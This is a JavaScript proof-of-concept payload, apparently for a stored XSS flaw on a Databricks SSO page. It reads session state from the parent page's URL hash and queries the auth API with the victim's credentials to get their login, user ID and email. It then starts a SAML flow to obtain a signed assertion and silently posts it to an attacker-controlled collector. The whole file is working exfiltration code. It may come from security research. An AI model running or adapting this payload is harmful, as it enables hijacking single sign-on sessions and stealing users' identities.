// r23 PoC: same stored sink, but the exfil is a SILENT cross-origin POST to an https collector the
// attacker owns, so the victim's tab never leaves the Databricks page. CSP on the route is
// connect-src 'self' https:, which permits any https destination.
(async function(){
  var P='P2fI1vZEAVlmwTIExz7Aec6Y0lLV', H='https://auth.sso.pub.databricks.com';
  var SINK='https://oob.sanlab-r19.dynv6.net:18443/r23-silent';
  var o={origin:(function(){try{return self.origin}catch(e){return '?'}})(),href:location.href,
         top:(function(){try{return (window.top||window.parent).location.href}catch(e){return 'blocked'}})()};
  var st='',app='SA35gbcNYD9HgQgYxFLY4jqBubVBl',flow='bevy-sign-up-and-sign-in';
  try{var h=((window.top||window.parent).location.hash)||'';
      var m=/st=([^&]+)/.exec(h); if(m)st=decodeURIComponent(m[1]);
      var m2=/app=([^&]+)/.exec(h); if(m2)app=decodeURIComponent(m2[1]);
      var m3=/flow=([^&]+)/.exec(h); if(m3)flow=decodeURIComponent(m3[1]);
  }catch(e){o.hashErr=String(e);}
  o.state_id=st; o.sso_app=app; o.flow=flow;
  try{
    var r=await fetch(H+'/v1/auth/me',{credentials:'include',headers:{'Authorization':'Bearer '+P}});
    o.me=r.status; var j=await r.json();
    o.login=(j.loginIds||[])[0]||''; o.uid=j.userId||''; o.email=j.email||'';
  }catch(e){o.meErr=String(e);}
  var saml='';
  try{
    var cfg=await (await fetch(H+'/pages/'+P+'/v2-beta/config.json')).json();
    var fv={}; fv[flow]=((cfg.flows||{})[flow]||{}).version||0;
    var r2=await fetch(H+'/v1/flow/start',{method:'POST',credentials:'include',
      headers:{'Authorization':'Bearer '+P,'Content-Type':'application/json'},
      body:JSON.stringify({flowId:flow,
        options:{samlIdpStateId:st,ssoAppId:app,location:'https://sso.pub.databricks.com/?flow='+flow},
        flowVersions:fv, componentsVersion:cfg.componentsVersion||''})});
    o.flowstart=r2.status; var j2=await r2.json();
    saml=((j2.samlIdpResponse||{}).samlResponse)||'';
    o.acs=((j2.samlIdpResponse||{}).url)||''; o.relay=((j2.samlIdpResponse||{}).relayState)||'';
    o.assertion_len=saml.length;
  }catch(e){o.fsErr=String(e);}
  try{
    await fetch(SINK,{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},
                      body:JSON.stringify({meta:o,saml:saml})});
    o.sent=true;
  }catch(e){o.sendErr=String(e);}
  try{window.__r23=o;}catch(e){}
})();
